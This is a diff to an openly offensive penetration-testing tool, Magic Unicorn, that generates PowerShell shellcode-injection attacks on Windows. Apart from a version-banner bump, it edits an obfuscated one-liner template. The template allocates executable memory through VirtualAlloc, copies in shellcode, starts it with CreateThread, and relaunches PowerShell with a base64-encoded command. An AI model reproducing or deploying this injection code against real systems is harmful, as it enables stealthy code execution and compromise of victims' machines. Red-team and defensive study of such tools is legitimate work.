@@ -443,7 +443,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.4.1 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.4.2 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -947,7 +947,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     msv = mangle_word("msvcrt.dll")
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex "& $2222 -e''c $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -passthru;$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Length -gt 0x$randstack){$gggg=$zzzz.Length};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for ($iiii=0;$iiii -le ($zzzz.Length-1);$iiii++) {$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);for (;){Start-Sleep 60};';$hhhh=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex "& $2222 -ec $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
